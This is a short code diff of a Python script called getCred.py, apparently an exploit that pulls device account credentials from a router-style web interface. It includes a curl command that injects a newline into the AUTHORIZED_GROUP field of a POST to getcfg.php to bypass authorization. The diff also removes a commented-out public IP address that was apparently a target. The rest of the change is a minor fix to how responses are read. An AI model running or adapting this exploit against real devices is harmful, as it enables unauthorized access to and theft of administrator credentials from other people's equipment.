@@ -16,7 +16,6 @@ except:
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-# url = 'http://58.237.50.225/'
 if len(sys.argv)<2:
     print("Usage: python27 getCred.py http://127.0.0.1")
     exit()
@@ -34,10 +33,10 @@ except:
     print(os.system("curl -k -d \"SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a\" {}getcfg.php".format(url)))
     exit()
 
-if 'Not authorized' in res.content:
+if 'Not authorized' in res.text:
     print("authorize fail..")
     exit()
-elif "BAD REQUEST" in res.content:
+elif "BAD REQUEST" in res.text:
     print("BAD REQUEST, unsupported HTTP request")
 
 tree = etree.fromstring(res.content)
